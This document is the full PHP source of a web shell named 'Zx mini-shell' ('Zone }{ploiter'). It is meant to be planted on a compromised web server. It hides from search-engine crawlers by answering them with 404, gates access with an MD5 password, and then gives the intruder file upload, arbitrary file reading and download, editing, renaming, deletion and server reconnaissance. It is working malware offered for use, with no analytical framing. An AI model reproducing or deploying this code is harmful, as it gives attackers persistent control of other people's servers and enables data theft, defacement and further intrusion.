<?php
session_start();
error_reporting(0);
set_time_limit(0);
 
$auth_pass = "412c59d9f8e4f4caccb57889255f896d";
$user = "wongedan";
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<!doctype html>
<html amp="amp">
<head>
<meta charset="utf-8">
<link as='script' href='https://cdn.ampproject.org/v0.js' rel='preload'/>
<link as='script' href='https://cdn.ampproject.org/v0/amp-iframe-0.1.js' rel='preload'/>
<title>amp-iframe</title>
<link rel="canonical" href="https://rawcdn.githack.com/animovi/html/master/particle6-amp.html">
<script async src="https://cdn.ampproject.org/v0.js"></script>
<script async custom-element="amp-iframe" src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js"></script>
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1"> 
<style amp-boilerplate>
body{
-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both
}
@-webkit-keyframes -amp-start{
from{
visibility:hidden}to{visibility:visible
}}
@-moz-keyframes -amp-start{
from{
visibility:hidden
}
to{
visibility:visible
}}
@-ms-keyframes -amp-start{
from{
visibility:hidden
}
to{
visibility:visible
}}
@-o-keyframes -amp-start{
from{
visibility:hidden
}
to{
visibility:visible
}}
@keyframes -amp-start{
from{
visibility:hidden
}to{
visibility:visible
}}
</style>
<noscript>
<style amp-boilerplate>
body{
-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none
}
</style>
</noscript>
<style amp-custom> 
.canvas-box {
 	background: linear-gradient(90deg,black 100%,black 100%,black 100%);
 	position: relative;
 	width: 100%;
  background-size: 100% 100%;
 } 
.canvas-box amp-iframe {
 	position: absolute;
 	top: 0;
 	left: 0;
 	width: 100%;
 	height: 100%;
 	z-index: 1;
 } 
.canvas-box body {
 	font-size: 3.25rem;
 	font-weight: bold;
 	font-family: -apple-system,BlinkMacSystemFont,"Roboto","Segoe UI","Oxygen-Sans","Ubuntu","Cantarell","Helvetica Neue",sans-serif;
 	text-align: center;
 	color: #fff;
 	line-height: 1.3;
 	position: absolute;
 	top: 10%; 	left: 0;
 	right: 0;
 	z-index: 2;
 }
input[type=password] {
    width: 150px;
    height: 8px;
    color: red;
    background: #000000;
    border: 2px solid red;
    padding: 5px;
    text-align: center;
}
body {
    background: black;
}
</style> 
</head>
<center> 
<body> 
<div class="canvas-box"> 
<amp-iframe width="100%" layout="responsive" sandbox="allow-scripts allow-same-origin allow-popups" allowfullscreen="100%" frameborder="0" noloading="" src="https://cdn.staticaly.com/gh/animovi/html/master/particlecanvas-3.html?color=0f1"> 
<amp-img src="https://1.bp.blogspot.com/-x1yVa6ztsWY/WyHFPLG0uLI/AAAAAAAAyIg/3C5Lb5EjGywOPzO_XSwK1XTu6VlBZE4SgCLcBGAs/s1600/back-iframe.png" layout="100%" width="100%" placeholder></amp-img> 
</amp-iframe> 
<link href='https://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet' type='text/css'>
    <font style="color:red;text-shadow:0px 5px 8px #191970;font-size:50px" face="Ubuntu">Zx mini-shell</font><br>
    <img src="https://cdn.wallpapersafari.com/93/13/BdU9z0.jpg" width=300px style="margin-top:100px; margin-buttom:100px;" align=center><br>
<font color="red">password</font>
</div><br>
<form method="post">
<input type="password" name="pass"><br>
<font color="white" face="courier" size="1">-:[ © 2019 w0n63d4n ]:-</font>
</form>
</body>
</center>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
       $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
//password until here
?>
<?php
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
?>
<!DOCTYPE html>
<html>
<head>
<meta name="description" content="Zone-Xploit">
<link rel="icon" type="http://krypsec.com/it-courses/IT-Training/image/hacker3.gif"> 
<meta property="og:image" content="https://i.ibb.co/6R8zRgN/IMG-20190515-WA0179.jpg">
<link href='http://www.ahprinting.com/upload/files/lnxiceland.css' rel='stylesheet' type='text/css'>
<link href="" rel="stylesheet" type="text/css">
<title>Anjay !!</title>
<link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
<style type="text/css">
body{
background: black;
color:#eceff1;
font-family:'iceland';
margin:0;
font-size: 14px;
}
h1{
font-family:'opal';
font-weight:normal;
font-size:60px;
margin:0;
}
h1:hover{
color:red;
}
select{
background:red;
color:white;
}
a{
color:white;
text-decoration:none;
font-family:'iceland';
}
textarea{
width:900px;
height:250px;
background:transparent;
border:1px dashed lime;
color:lime;
padding:2px;
}
tr.first{
border-bottom:1px dashed red;
}
tr:hover{
background: red;
}
th{
background: darkred;
padding:5px;
}
td{
        font-size: 20px;
        border:1px solid darkred;
        border-collapse: collapse;
        border-size: 1px;
        padding: 1px;
        align: center;
}
.text{
        font-size: 20px;
}
</style>
<style>
@font-face {
    font-family: opal;
    src: url(https://watchdogsfont.com/font/HACKED_Title.ttf);
}  
</style>
</head>
<body>
<?php 
$fun = @ini_get("disable_functions");
$benon = (!empty($fun)) ? '<font color="yellow">ADA BOS :(</font>' : '<font color="lime">Bersih boss !</font>';
$mysql = (function_exists('mysql_connect')) ? '<font color="lime">ON</font>' : '<font color="red">OFF</font>';
$mssql = (function_exists('mssql_connect')) ? '<font color="lime">ON</font>' : '<font color="red">OFF</font>';
echo'<div style="color:red;margin-top:0;"><h1><center>Zone }{ploiter</center></h1></div><br>'; 
if(isset($_GET['path'])) { 
	$path = $_GET['path'];
	chdir($_GET['path']);
}else{$path = getcwd();
}
$path = str_replace("\\","/",$path);
$paths = explode("/", $path); 
echo '<table width="100%" border="1" color="red" align="center" style="margin-top:-10px;"><tr><td>';
echo "<font color='lime' style='font-size:14px;'>Path: "; 
foreach($paths as $id => $pat) 
{
	echo "<a style='font-size:14px; font-color:lime;' href='?path="; 
	for($i = 0; $i <= $id; $i++) 
	{
		echo $paths[$i]; if($i != $id) 
		{
			echo "/";
			} 
		}echo "'>$pat</a>/";
		} 
		echo '<br><font color="white">DISABLE FUNCTIONS : </font>'.$benon.'<br>
<font color="white">ADMIN : <font color="lime">'.$_SERVER["SERVER_ADMIN"].'<br>
<font color="white">YOUR IP : <font color="lime">'.$_SERVER["REMOTE_ADDR"].'<br>
<font color="white">SERVER IP : <font color="lime">'.$_SERVER["SERVER_ADDR"].'<br>
<font color="white">DOMAIN : <font color="lime">'.$_SERVER["SERVER_NAME"].'<br>
<font color="white">PORT SERVER : <font color="lime">'.$_SERVER["SERVER_PORT"].'<br>
<font color="white">PROGRAM : <font color="white">| MYSQL :'.$mysql.' | MSSQL : '.$mssql.' |<br><font color="lime">
[ <a href="?">Home</a> ]</font></td>
<td align="center" width="35%"><form enctype="multipart/form-data" method="POST"><input style="color:lime;" type="file" name="file"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
echo "<li><font size='5'>[ <a style='color: yellow;' href='?logout=true'>Logout</a> ]</font></li>";
if($_GET['logout'] == true){
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
}
    $edan = "<br><form method='post'>
           Buat Folder: <input type='text' rows='3' name='namafolder' placeholder='Nama Folder...'> <input type='submit' name='buat' value='Buat !!!'>
            </form>		
            ";
    echo $edan;
  if (isset($_GET['tambah_folder'])) {
       echo $edan;
        }
       if (isset($_POST['buat'])) {
          $folder = getcwd();
          $nama_folder = $_POST['namafolder'];

          $handle = mkdir($folder ."/$nama_folder", 0777); {
            echo "<script>alert('folder sukses dibuat asw !!');</script>";
            echo "<script>window.location='?path=".$path."';</script>";
            echo $handle;
          }
        }

		if(isset($_FILES['file'])){ 
			if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ 
				echo '<center><font color="lime">Upload OK!.</font></center><br/>';
				} else{
					echo '<center><font color="red">Upload Failed!.</font></center><br/>';
					}
					} echo '</td></tr><tr><td></table>'; 
					if(isset($_GET['filesrc'])){ 
						echo '<table width="100%" style="border: 1px solid lime;" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
						echo "".basename($_GET['filesrc']);"";
						echo '</tr></td></table><br />';
						echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");
						} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ 
							echo '</table><br /><center>'.$_POST['path'].'<br /><br />'; 
							if($_POST['opt'] == 'rename'){ 
								if(isset($_POST['newname'])){ 
									if(rename($_POST['path'],$path.'/'.$_POST['newname'])){ 
										echo '<center><font color="lime">Rename OK!</font></center><br />'; 
										}else{ 
											echo '<center><font color="red">Rename Failed!</font></center><br />'; 
											} 
											$_POST['name'] = $_POST['newname'];
											} 
											echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /> <input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>'; 
											}elseif($_POST['opt'] == 'edit'){ 
												if(isset($_POST['src'])){ $fp = fopen($_POST['path'],'w');
												if(fwrite($fp,$_POST['src'])){
													echo '<center><font color="lime">Edit File OK!.</font></center><br />'; 
													}else{
														echo '<center><font color="red">Edit File Failed!.</font></center><br />';
														}
														fclose($fp);
														} 
														echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="hajar" /></form>';
														}
														echo '</center>';
														}else{
															echo '</table><br /><center>'; 
															if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ 
																if($_POST['type'] == 'dir'){ 
																	if(rmdir($_POST['path'])){ 
																		echo '<center><font color="lime">Dir Deleted!</font></center><br />'; 
																		}else{
																			echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
																			} 
																			}elseif($_POST['type'] == 'file'){ 
																				if(unlink($_POST['path'])){
																					echo '<font color="lime">Delete File Done.</font><br />';
																					}else{ 
																						echo '<font color="red">Delete File Error.</font><br />';
																						}
																						}
																						}echo '</center>'; 
																						$scandir = scandir($path); 
																						echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>'; 
																						foreach($scandir as $dir){ 
																							if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue; 
																							echo "<tr><td><img src=\"https://cdn.pixabay.com/photo/2013/07/12/13/55/dossier-147590_1280.png\" width=\"30\"/> <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>"; 
if(is_writable("$path/$dir")) 
echo '<font color="lime">'; 
elseif(!is_writable("$path/$dir"))
echo '<font color="red">';
elseif(!is_readable("$path/$dir"))
echo '<font color="red">'; 
echo perms("$path/$dir");

																							if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>'; 
																							echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$dir"))."";
																							echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
																							} foreach($scandir as $file){if(!is_file("$path/$file")) continue;
																							$size = filesize("$path/$file")/1024; 
																							$size = round($size,3);
																							if($size >= 1024){
																								$size = round($size/1024,2).' MB';
																								}else{
																									$size = $size.' KB';
																									} 
																									echo "<tr><td><img src=\"https://cdn.pixabay.com/photo/2017/03/08/21/19/file-2127825_1280.png\" width=\"30\"/><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>"; 
																									if(is_writable("$path/$file")) echo '<font color="lime">'; 
                    elseif(!is_writable("$path/$file")) echo '<font color="red">';
																									elseif(!is_readable("$path/$file")) echo '<font color="red">'; 
																									echo perms("$path/$file"); 
																									if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>'; 
																									echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file")).""; 
																									echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
																									} echo '</table></div>';
																									}echo '</body></html>'; 
																									function perms($file){
																										$perms = fileperms($file);
																										if (($perms & 0xC000) == 0xC000) {
																											$info = 's';
																											} elseif (($perms & 0xA000) == 0xA000) {
																												$info = 'l';
																												} elseif (($perms & 0x8000) == 0x8000) {
																													$info = '-';
																													} elseif (($perms & 0x6000) == 0x6000) {
																														$info = 'b';
																														} elseif (($perms & 0x4000) == 0x4000) {
																															$info = 'd';
																															} elseif (($perms & 0x2000) == 0x2000) {
																																$info = 'c';
																																} elseif (($perms & 0x1000) == 0x1000) {
																																	$info = 'p';
																																	} else {
																																		$info = 'u';
																																		} $info .= (($perms & 0x0100) ? 'r' : '-');
																																		$info .= (($perms & 0x0080) ? 'w' : '-');
																																		$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
																																		$info .= (($perms & 0x0020) ? 'r' : '-');
																																		$info .= (($perms & 0x0010) ? 'w' : '-');
																																		$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
																																		$info .= (($perms & 0x0004) ? 'r' : '-');
																																		$info .= (($perms & 0x0002) ? 'w' : '-');
																																		$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
																																		return $info;
																																		} echo'<br><center>&copy; 
																																		2019 - <a href="http://www.zonexploiter.id/">Mr.w0n63d4n</a>.</center><br>';
?>
